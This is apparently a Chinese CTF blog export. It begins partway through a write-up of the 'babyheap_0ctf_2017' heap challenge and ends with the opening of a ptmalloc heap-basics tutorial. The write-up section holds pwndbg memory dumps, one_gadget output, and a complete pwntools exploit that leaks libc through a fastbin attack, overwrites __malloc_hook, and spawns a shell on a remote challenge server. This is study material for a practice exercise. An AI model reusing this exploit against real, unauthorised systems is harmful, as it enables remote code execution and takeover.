class="line">0x60: 0x0</span><br><span class="line">0x70: 0x5563feb05080 ◂— 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5563feb050f0 —▸ 0x7f66aa6bfb78 (main_arena+88) ◂— 0x5563feb050f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx 0x5563feb05000</span><br><span class="line">0x5563feb05000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5563feb05010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5563feb05030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5563feb05050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5563feb05070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05080:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x5563feb05090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb050a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb050b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb050c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb050d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb050e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb050f0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5563feb05100:	0x00007f66aa6bfb78	0x00007f66aa6bfb78</span><br><span class="line">0x5563feb05110:	0x0000000000000020	0x0000000000000090</span><br><span class="line">0x5563feb05120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5563feb05180:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="修改idx2内容，使其为malloc-hook附近构造chunk的地址"><a href="#修改idx2内容，使其为malloc-hook附近构造chunk的地址" class="headerlink" title="修改idx2内容，使其为malloc_hook附近构造chunk的地址"></a>修改idx2内容，使其为malloc_hook附近构造chunk的地址</h5><p>修改idx2内容，使其为malloc_hook附近构造chunk的地址，这块地址将来要创建一个虚假的chunk，要求是大小不能超过fastbin，并且包含malloc_hook，因为后面要将malloc_hook修改，使其指向其他函数，执行攻击。一般会将伪造的chunk的size为0x7f，正好在fastbin要求之内，也足够大，计算该地址为malloc_hook</p>
<p>查看malloc_hook的位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt;  x/32gx (long long)(&amp;main_arena)-0x40</span><br><span class="line">0x7f66aa6bfae0 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f66aa6bfaf0 &lt;_IO_wide_data_0+304&gt;:	0x00007f66aa6be260	0x0000000000000000<span class="comment">#计算可知要构造size位为:0x000000000000007f，其地址为malloc_hook-35</span></span><br><span class="line">0x7f66aa6bfb00 &lt;__memalign_hook&gt;:	0x00007f66aa380ea0	0x00007f66aa380a70</span><br><span class="line">0x7f66aa6bfb10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f66aa6bfb20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f66aa6bfb30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f66aa6bfb40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f66aa6bfb50 &lt;main_arena+48&gt;:	0x00005563feb05080	0x0000000000000000</span><br><span class="line">0x7f66aa6bfb60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f66aa6bfb70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005563feb051a0</span><br><span class="line">0x7f66aa6bfb80 &lt;main_arena+96&gt;:	0x00005563feb050f0	0x00005563feb050f0</span><br><span class="line">0x7f66aa6bfb90 &lt;main_arena+112&gt;:	0x00005563feb050f0	0x00007f66aa6bfb88</span><br><span class="line">0x7f66aa6bfba0 &lt;main_arena+128&gt;:	0x00007f66aa6bfb88	0x00007f66aa6bfb98</span><br><span class="line">0x7f66aa6bfbb0 &lt;main_arena+144&gt;:	0x00007f66aa6bfb98	0x00007f66aa6bfba8</span><br><span class="line">0x7f66aa6bfbc0 &lt;main_arena+160&gt;:	0x00007f66aa6bfba8	0x00007f66aa6bfbb8</span><br><span class="line">0x7f66aa6bfbd0 &lt;main_arena+176&gt;:	0x00007f66aa6bfbb8	0x00007f66aa6bfbc8</span><br><span class="line">pwndbg&gt; x/2gx 0x7f66aa6bfb10-35 </span><br><span class="line">0x7f66aa6bfaed &lt;_IO_wide_data_0+301&gt;:	0x66aa6be260000000	0x000000000000007f </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(__malloc_hook - <span class="number">35</span>) </span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad11000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad11020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad11040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad11060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad11080</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x7f5647966aed<span class="comment">#指向(_IO_wide_data_0+301)</span></span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad110f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f5647966b78</span><br><span class="line">bk: 0x7f5647966b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5582aad11110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5582aad111a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x5582aad11080 —▸ 0x7f5647966aed (_IO_wide_data_0+301) ◂— 0x5647627ea0000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5582aad110f0 —▸ 0x7f5647966b78 (main_arena+88) ◂— 0x5582aad110f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx 0x5582aad11000</span><br><span class="line">0x5582aad11000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5582aad11010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5582aad11030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5582aad11050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5582aad11070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11080:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x5582aad11090:	0x00007f5647966aed	0x0000000000000000</span><br><span class="line">0x5582aad110a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad110b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad110c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad110d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad110e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad110f0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5582aad11100:	0x00007f5647966b78	0x00007f5647966b78</span><br><span class="line">0x5582aad11110:	0x0000000000000020	0x0000000000000090</span><br><span class="line">0x5582aad11120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5582aad11180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x/30gx 0x7f5647966aed</span><br><span class="line">0x7f5647966aed &lt;_IO_wide_data_0+301&gt;:	0x5647965260000000	0x000000000000007f</span><br><span class="line">0x7f5647966afd:	0x5647627ea0000000	0x5647627a7000007f</span><br><span class="line">0x7f5647966b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7f5647966b1d:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f5647966b2d &lt;main_arena+13&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f5647966b3d &lt;main_arena+29&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f5647966b4d &lt;main_arena+45&gt;:	0x82aad11080000000	0x0000000000000055</span><br><span class="line">0x7f5647966b5d &lt;main_arena+61&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f5647966b6d &lt;main_arena+77&gt;:	0x0000000000000000	0x82aad111a0000000</span><br><span class="line">0x7f5647966b7d &lt;main_arena+93&gt;:	0x82aad110f0000055	0x82aad110f0000055</span><br><span class="line">0x7f5647966b8d &lt;main_arena+109&gt;:	0x82aad110f0000055	0x5647966b88000055</span><br><span class="line">0x7f5647966b9d &lt;main_arena+125&gt;:	0x5647966b8800007f	0x5647966b9800007f</span><br><span class="line">0x7f5647966bad &lt;main_arena+141&gt;:	0x5647966b9800007f	0x5647966ba800007f</span><br><span class="line">0x7f5647966bbd &lt;main_arena+157&gt;:	0x5647966ba800007f	0x5647966bb800007f</span><br><span class="line">0x7f5647966bcd &lt;main_arena+173&gt;:	0x5647966bb800007f	0x5647966bc800007f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="申请假chunk，并将malloc-hook修改-malloc-gt-gadget"><a href="#申请假chunk，并将malloc-hook修改-malloc-gt-gadget" class="headerlink" title="申请假chunk，并将malloc_hook修改 malloc-&gt;gadget"></a>申请假chunk，并将malloc_hook修改 malloc-&gt;gadget</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)<span class="comment">#申请假chunk</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>) </span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>) </span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)  </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab09000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab09020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab09040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab09060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab09080</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab090f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f99e2ffeb78</span><br><span class="line">bk: 0x7f99e2ffeb78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x562f5ab09110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x562f5ab091a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x99e2cbfea0000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x562f5ab090f0 —▸ 0x7f99e2ffeb78 (main_arena+88) ◂— 0x562f5ab090f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/30gx 0x562f5ab09000</span><br><span class="line">0x562f5ab09000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562f5ab09010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab09020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562f5ab09030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab09040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562f5ab09050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab09060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562f5ab09070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab09080:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x562f5ab09090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab090a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab090b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab090c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab090d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562f5ab090e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="再次执行malloc"><a href="#再次执行malloc" class="headerlink" title="再次执行malloc"></a>再次执行malloc</h5><p>因为malloc_hook已经被修改到其他地址，我们再次执行malloc，则会执行我们的目标函数，用one_gadget找到目标函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fanfan@ubuntu:~/pwn challenges/heap$ one_gadget libc-<span class="number">2.23</span>.so</span><br><span class="line"><span class="number">0x45226</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0x4527a</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x30</span>, environ)<span class="comment">#不知道什么问题，我的目标函数跑打不通，0x4526a则可以</span></span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x30</span>] == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0xf03a4</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x50</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x50</span>] == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0xf1247</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == NULL</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allo(<span class="number">79</span>)<span class="comment">#getshell</span></span><br></pre></td></tr></table></figure>

<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29856</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allo</span>(<span class="params">size</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">allo(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>) <span class="comment"># 使2的chunk空闲块指向了4号块的位置,4号位为较大的chunk，用来获取目标地址</span></span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 让4号块的大小变成0x21，这样4号块就意义上被free了</span></span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1 The original position of 2 # 申请原本2号块</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2 4 Simultaneous pointing	# 这里就会申请到4号块的位置</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 将4号块的大小改回 0x91,不然找不到top chunk位置</span></span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x80</span>) <span class="comment"># 在申请一块大空间，避免4号块和top chunk合并</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)    <span class="comment"># 释放4号块</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">libc_base = __malloc_hook - libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;__malloc_hook: &quot;</span>+ <span class="built_in">hex</span>(__malloc_hook))</span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span>+ <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># 相当于做一个切割，将0x80的块分成0x60在fastbin中，0x20在unsortedbin中</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(__malloc_hook - <span class="number">35</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>) <span class="comment"># 这个就会申请到假chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>内核学习</title>
    <url>/2023/03/14/%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>堆学习</title>
    <url>/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p><strong>前言：栈草草的结束了，只掌握一些简单的rop利用，至于为什么这么早想学习堆，可能跟我的学习理念有关吧，我的学习理念是了解重要的学习框架，先将基础结构的相对简单的内容学会，再同步深入学习更深度的内容。现在相比较学习栈的其他花里胡哨的利用方式，我更想先学习堆的基本内容和简单利用</strong></p>
<h1 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h1><p>堆不同于栈，堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。在 CTF 的 pwn 程序中，栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现。</p>
<p> <strong>堆的生长方向是从低地址向高地址生长的，而栈是从高地址向低地址生长的。</strong></p>
<p>实际上堆可以申请到的内存空间比栈要大很多，在 linux 的 4G 的虚拟内存空间里最高可以达到 2.9 G 的空间</p>
<blockquote>
<p>对堆操作的<strong>是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p>
</blockquote>
<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-15%20120910.png"></p>
<p>俺以 <strong>glibc 库下的 ptmalloc2 堆管理器</strong>为例学习</p>
<h2 id="堆的基本结构"><a href="#堆的基本结构" class="headerlink" title="堆的基本结构"></a>堆的基本结构</h2><p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-15%20142218.png"></p>
<p>当用户通过<strong>malloc</strong>等函数申请空间时，实际上是从堆中分配内存，ptmalloc根据用户的需要，为用户分配不同类型的chunk</p>
<p>malloc_chunk结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">    INTERNAL_SIZE_T prev_size; <span class="comment">/* Size of previous chunk (if free). */</span></span><br><span class="line">    INTERNAL_SIZE_T size; <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Only used for large blocks: pointer to next larger size. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>每个程序分配的内存(这里指的是malloc函数)，在内部被一个叫”堆块”的所替代。一个堆块是由程序返回内存组成的(实际上是malloc的返回值)。这块区域在申请新的内存的时候会不断扩大。同样，当一定数量的内存释放时，堆也可以收缩。</p>
<p><strong>1.pre_size 字段:</strong> 只有在前面一个堆块是空闲的时候才有值，用来指示前一个堆块的大小。前面一个堆块在使用时，他的值始终为 0<br><strong>2.size 字段:</strong> 是用来指示当前堆块的大小的（头部包括pre_size加上 user data 的大小）。但是这个字段的最后三位相当于三个 flag ，有另外的作用。</p>
<p>​      <code>NON_MAIN_ARENA</code>，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</p>
<p>​      <code>IS_MAPPED</code>，记录当前 chunk 是否是由 mmap 分配的。</p>
<p>​      <code> PREV_INUSE</code>，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
<p><strong>3..user data</strong> 就是用来存放用户数据的。使用malloc函数分配到的内存的返回地址是指user data(用户数据区)</p>
<p>例如在64位程序中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>申请到的堆块总大小为 16 + 8 + 8 + 1 &#x3D; 0x21</p>
<p>1.第一个 16 字节是<strong>系统最小分配的内存</strong>，也就是说你如果想要申请的内存小于系统最小分配的内存的话，就会按照最小的内存来分配。</p>
<ul>
<li>在 64 位系统中这个值是 16 个字节，在 32 位系统中是 8 个字节</li>
<li>例如，如果代码中是 malloc(0) 的话，<strong>堆管理器也会分配最小内存空间给你</strong></li>
</ul>
<p>2.第二个 8 字节是 pre size 字段的大小（32 位的为 4 字节）<br>3.第三个 8 字节为 size 字段的大小（32 位的为 4 字节）<br>4.最后一个 1 字节是 <strong>PREV_INUSE 的值，只有 0 或 1两个值</strong></p>
<h2 id="指针与地址"><a href="#指针与地址" class="headerlink" title="指针与地址"></a>指针与地址</h2><p>首先要明确用户在调用 malloc 函数时返回的值为<strong>一个指针，指向分配到堆空间（用户数据区）</strong></p>
<p><img src="/2023/03/14/%E5%A0%86%E5%AD%A6%E4%B9%A0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-15%20151811.png"></p>
<p>first chunk（second chunk）表示第一和第二个结构，<strong>每个结构中都有一个 point_heap 指针来指向存储用户数据的堆块（chunk）。</strong></p>
